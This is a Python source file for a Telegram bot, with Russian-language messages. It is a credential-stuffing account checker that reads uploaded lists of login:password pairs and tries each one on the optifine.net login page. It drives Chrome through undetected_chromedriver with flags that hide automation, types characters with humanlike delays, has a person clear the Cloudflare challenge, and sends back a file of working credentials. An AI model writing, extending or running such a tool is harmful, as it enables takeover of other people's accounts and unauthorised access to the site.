import os
import sys
import logging
import asyncio
import aiofiles
import time
import random
import subprocess
from datetime import datetime
from typing import Dict, List, Tuple

import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException, WebDriverException

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler('/app/debug/bot.log')
    ]
)
logger = logging.getLogger(__name__)

TOKEN = os.environ.get('BOT_TOKEN')
if not TOKEN:
    print("❌ НЕТ ТОКЕНА!")
    sys.exit(1)

ADMIN_IDS = os.environ.get('ADMIN_IDS', '').split(',')
ADMIN_IDS = [int(id.strip()) for id in ADMIN_IDS if id.strip()]
ALLOWED_USERS = ADMIN_IDS.copy() if ADMIN_IDS else []

bot_stats = {
    'total': 0,
    'valid': 0,
    'invalid': 0,
    'start_time': datetime.now()
}

active_sessions = {}
os.makedirs('/app/debug', exist_ok=True)

class OptifineChecker:
    def __init__(self):
        self.driver = None
        self.cloudflare_passed = False
        logger.info("🚀 Инициализация...")
    
    def init_driver(self):
        try:
            options = uc.ChromeOptions()
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')
            options.add_argument('--window-size=1920,1080')
            options.add_argument('--start-maximized')
            options.add_argument('--disable-gpu')
            options.add_argument('--disable-blink-features=AutomationControlled')
            options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
            
            self.driver = uc.Chrome(options=options, version_main=145, headless=False)
            self.driver.set_page_load_timeout(60)
            logger.info("✅ Драйвер готов")
            return True
        except Exception as e:
            logger.error(f"❌ Ошибка: {e}")
            return False
    
    def check_cloudflare(self):
        try:
            page_source = self.driver.page_source
            if 'just a moment' in self.driver.title.lower():
                return False
            if 'turnstile' in page_source:
                return False
            return True
        except:
            return False

    async def check_account(self, login, password):
        logger.info(f"🔍 Проверяю: {login[:20]}...")
        try:
            inputs = self.driver.find_elements(By.TAG_NAME, "input")
            email, pwd = None, None
            for inp in inputs:
                if inp.is_displayed():
                    if inp.get_attribute('type') in ['text', 'email']:
                        email = inp
                    elif inp.get_attribute('type') == 'password':
                        pwd = inp
            
            if not email or not pwd:
                return {'login': login, 'status': 'error', 'error': 'Поля не найдены'}
            
            buttons = self.driver.find_elements(By.TAG_NAME, "button")
            btn = None
            for b in buttons:
                if b.is_displayed() and 'login' in b.text.lower():
                    btn = b
                    break
            
            if not btn:
                return {'login': login, 'status': 'error', 'error': 'Кнопка не найдена'}
            
            email.clear()
            for c in login:
                email.send_keys(c)
                time.sleep(0.03)
            
            time.sleep(0.5)
            pwd.clear()
            for c in password:
                pwd.send_keys(c)
                time.sleep(0.03)
            
            time.sleep(0.5)
            btn.click()
            time.sleep(5)
            
            if 'downloads' in self.driver.current_url:
                return {'login': login, 'password': password, 'status': 'valid'}
            return {'login': login, 'status': 'invalid', 'error': 'Неверный логин/пароль'}
        except Exception as e:
            return {'login': login, 'status': 'error', 'error': str(e)[:100]}

    def close(self):
        if self.driver:
            self.driver.quit()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if ALLOWED_USERS and update.effective_user.id not in ALLOWED_USERS:
        await update.message.reply_text("❌ **Нет доступа**")
        return
    await update.message.reply_text("👋 Отправь .txt файл с логинами и паролями")

async def process_file(file_path, update, context):
    async with aiofiles.open(file_path, 'r', encoding='utf-8') as f:
        content = await f.read()
    
    accounts = []
    for line in content.strip().split('\n'):
        if ':' in line:
            l, p = line.split(':', 1)
            accounts.append((l.strip(), p.strip()))
    
    if not accounts:
        await update.message.reply_text("❌ Нет аккаунтов")
        return
    
    session_id = f"{update.effective_user.id}_{int(time.time())}"
    
    # Получаем URL от Railway
    railway_url = None
    try:
        result = subprocess.run(['curl', '-s', 'http://metadata.railway.internal/'], 
                              capture_output=True, text=True, timeout=5)
        if result.returncode == 0:
            import json
            data = json.loads(result.stdout)
            railway_url = f"https://{data.get('hostname')}.railway.app"
    except:
        railway_url = "https://твой-проект.up.railway.app"
    
    keyboard = [
        [InlineKeyboardButton("✅ Я нажал галочку", callback_data=f"done_{session_id}")],
        [InlineKeyboardButton("❌ Отмена", callback_data=f"cancel_{session_id}")]
    ]
    
    await update.message.reply_text(
        f"🖥️ **ПОДКЛЮЧИСЬ К БРАУЗЕРУ RAILWAY**\n\n"
        f"🔗 **Ссылка:**\n"
        f"{railway_url}\n\n"
        f"📱 **Что делать:**\n"
        f"1️⃣ Открой ссылку в браузере\n"
        f"2️⃣ Нажми **Connect** (в центре экрана)\n"
        f"3️⃣ Ты увидишь рабочий стол с Chrome\n"
        f"4️⃣ В Chrome уже открыт optifine.net/login\n"
        f"5️⃣ **Нажми на галочку** мышкой\n"
        f"6️⃣ Вернись и нажми кнопку\n\n"
        f"📊 Аккаунтов: {len(accounts)}",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )
    
    active_sessions[session_id] = {
        'user_id': update.effective_user.id,
        'accounts': accounts,
        'file_path': file_path,
        'checker': None
    }

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    data = query.data
    if data.startswith('done_'):
        session_id = data.replace('done_', '')
        if session_id not in active_sessions:
            await query.edit_message_text("❌ Сессия устарела")
            return
        
        session = active_sessions[session_id]
        await query.edit_message_text("🚀 **Запускаю проверку...**")
        
        checker = OptifineChecker()
        if not checker.init_driver():
            await query.message.reply_text("❌ Ошибка запуска")
            return
        
        checker.driver.get("https://optifine.net/login")
        time.sleep(5)
        
        if not checker.check_cloudflare():
            await query.message.reply_text("❌ Cloudflare все еще активен. Нажми галочку еще раз.")
            checker.close()
            return
        
        results = {'valid': [], 'invalid': []}
        total = len(session['accounts'])
        
        msg = await query.message.reply_text(f"📊 Прогресс: 0/{total}")
        
        for i, (login, password) in enumerate(session['accounts'], 1):
            if i % 3 == 0:
                await msg.edit_text(f"📊 Прогресс: {i}/{total}\n✅ Рабочих: {len(results['valid'])}")
            
            result = await checker.check_account(login, password)
            if result['status'] == 'valid':
                results['valid'].append(result)
                bot_stats['valid'] += 1
            else:
                results['invalid'].append(result)
                bot_stats['invalid'] += 1
            bot_stats['total'] += 1
            await asyncio.sleep(2)
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        if results['valid']:
            fn = f"✅_РАБОЧИЕ_{len(results['valid'])}шт_{timestamp}.txt"
            async with aiofiles.open(fn, 'w') as f:
                for acc in results['valid']:
                    await f.write(f"{acc['login']}:{acc['password']}\n")
            with open(fn, 'rb') as f:
                await query.message.reply_document(f, filename=fn)
            os.remove(fn)
        
        await query.message.reply_text(f"✅ Готово! Всего: {total}, ✅ Рабочих: {len(results['valid'])}")
        checker.close()
        
        if os.path.exists(session['file_path']):
            os.remove(session['file_path'])
        del active_sessions[session_id]
    
    elif data.startswith('cancel_'):
        session_id = data.replace('cancel_', '')
        if session_id in active_sessions:
            if os.path.exists(active_sessions[session_id]['file_path']):
                os.remove(active_sessions[session_id]['file_path'])
            del active_sessions[session_id]
        await query.edit_message_text("❌ Отменено")

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if ALLOWED_USERS and update.effective_user.id not in ALLOWED_USERS:
        await update.message.reply_text("❌ **Нет доступа**")
        return
    
    doc = update.message.document
    if not doc.file_name.endswith('.txt'):
        await update.message.reply_text("❌ **Нужен .txt файл**")
        return
    
    file = await context.bot.get_file(doc.file_id)
    path = f"temp_{update.effective_user.id}_{doc.file_name}"
    await file.download_to_drive(path)
    await process_file(path, update, context)

def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    print("✅ БОТ ЗАПУЩЕН!")
    app.run_polling()

if __name__ == '__main__':
    main()